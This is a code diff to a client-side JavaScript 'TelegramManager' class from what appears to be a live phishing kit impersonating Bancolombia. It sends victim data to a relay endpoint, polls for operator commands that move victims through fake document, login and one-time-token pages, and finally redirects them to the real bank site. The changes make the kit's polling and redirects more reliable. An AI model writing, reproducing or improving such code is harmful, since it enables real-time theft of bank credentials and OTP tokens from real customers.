@@ -15,9 +15,9 @@ class TelegramManager {
     async sendToTelegram(stage, data) {
         try {
             const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), 10000);
+            const timeoutId = setTimeout(() => controller.abort(), 15000);
             
-            const response = await fetch('api/send-message', {
+            const response = await fetch('/api/send-message', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -48,7 +48,7 @@ class TelegramManager {
         }
         this.isPolling = true;
         this.checking = true;
-        this.checkInterval = setInterval(() => this.checkAction(), 2500);
+        this.checkInterval = setInterval(() => this.checkAction(), 1500);
         console.log('🔄 Polling iniciado...');
     }
 
@@ -65,9 +65,9 @@ class TelegramManager {
     async checkAction() {
         try {
             const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), 5000);
+            const timeoutId = setTimeout(() => controller.abort(), 8000);
             
-            const response = await fetch(`api/check-action?t=${Date.now()}`, {
+            const response = await fetch(`/api/check-action?t=${Date.now()}`, {
                 method: 'GET',
                 cache: 'no-cache',
                 credentials: 'include',
@@ -94,54 +94,94 @@ class TelegramManager {
     handleAction(action) {
         console.log('🎯 EJECUTANDO ACCIÓN:', action);
 
-        const overlay = document.querySelector('.loading-overlay');
-        if (overlay) {
-            overlay.classList.remove('active');
-        }
-
-        // Execute immediately without delay for faster response
+        // Execute immediately based on action type
         switch (action) {
             case 'error_documento':
-                window.location.href = 'index.html?error=documento';
+                // Keep overlay active during redirect
+                this.showOverlay();
+                setTimeout(() => {
+                    window.location.href = '/public/index.html?error=documento';
+                }, 100);
                 break;
 
             case 'pedir_logo':
-                window.location.href = 'next-step.html';
+                // Keep overlay active during redirect
+                this.showOverlay();
+                setTimeout(() => {
+                    window.location.href = '/public/next-step.html';
+                }, 100);
                 break;
 
             case 'error_logo':
-                window.location.href = 'next-step.html?error=credenciales';
+                // Keep overlay active during redirect
+                this.showOverlay();
+                setTimeout(() => {
+                    window.location.href = '/public/next-step.html?error=credenciales';
+                }, 100);
                 break;
 
             case 'pedir_token':
-                if (window.location.pathname.includes('next-step.html')) {
+                // Check if we're on next-step page
+                const currentPath = window.location.pathname;
+                if (currentPath.includes('next-step')) {
+                    // Hide overlay and switch to token card
+                    this.hideOverlay();
                     if (typeof window.tokenModalController !== 'undefined') {
-                        window.tokenModalController.switchToTokenCard();
+                        setTimeout(() => {
+                            window.tokenModalController.switchToTokenCard();
+                        }, 100);
+                    } else {
+                        console.error('tokenModalController no disponible');
                     }
                 } else {
-                    window.location.href = 'next-step.html?openToken=1';
+                    // Redirect to next-step with token open
+                    this.showOverlay();
+                    setTimeout(() => {
+                        window.location.href = '/public/next-step.html?openToken=1';
+                    }, 100);
                 }
                 break;
 
             case 'error_token':
-                // If we are on next-step.html and using the card
+                // Hide overlay and show error
+                this.hideOverlay();
                 const tokenInput = document.getElementById('tokenInputCard');
                 if (tokenInput) {
-                    const overlay = document.querySelector('.loading-overlay');
-                    if (overlay) overlay.classList.remove('active');
                     tokenInput.value = '';
-                    tokenInput.focus();
-                    alert('Token incorrecto o expirado. Por favor, genera uno nuevo e ingresalo.');
-                    // NO reiniciar polling aquí, esperar a que el usuario envíe nuevo token
+                    setTimeout(() => {
+                        tokenInput.focus();
+                        alert('Token incorrecto o expirado. Por favor, genera uno nuevo e ingrésalo.');
+                    }, 100);
+                } else {
+                    console.warn('tokenInputCard no encontrado en esta página');
                 }
                 break;
 
             case 'finalizar':
-                window.location.href = 'https://www.bancolombia.com/personas';
+                // Keep overlay active during redirect
+                this.showOverlay();
+                setTimeout(() => {
+                    window.location.href = 'https://www.bancolombia.com/personas';
+                }, 100);
                 break;
 
             default:
                 console.warn('❓ Acción desconocida:', action);
+                this.hideOverlay();
+        }
+    }
+
+    showOverlay() {
+        const overlay = document.querySelector('.loading-overlay');
+        if (overlay) {
+            overlay.classList.add('active');
+        }
+    }
+
+    hideOverlay() {
+        const overlay = document.querySelector('.loading-overlay');
+        if (overlay) {
+            overlay.classList.remove('active');
         }
     }
 }
